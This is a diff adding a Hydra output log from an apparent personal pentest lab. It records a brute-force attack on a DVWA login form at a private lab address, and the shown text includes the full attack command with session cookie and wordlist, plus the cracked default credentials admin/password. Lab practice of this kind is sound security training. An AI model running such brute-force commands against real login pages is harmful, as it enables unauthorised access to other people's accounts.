@@ -1,0 +1,2 @@
+# Hydra v9.6 run at 2026-05-24 02:42:22 on 192.168.56.129 http-get-form (hydra -l admin -P /home/kali/web-app-pentest-lab/wordlist.txt -o /home/kali/web-app-pentest-lab/scans/hydra-output.txt 192.168.56.129 http-get-form /dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: security=low; PHPSESSID=ca82bd3d753258d9c20e9c326f897cb7:F=Username and/or password incorrect.)
+[80][http-get-form] host: 192.168.56.129   login: admin   password: password
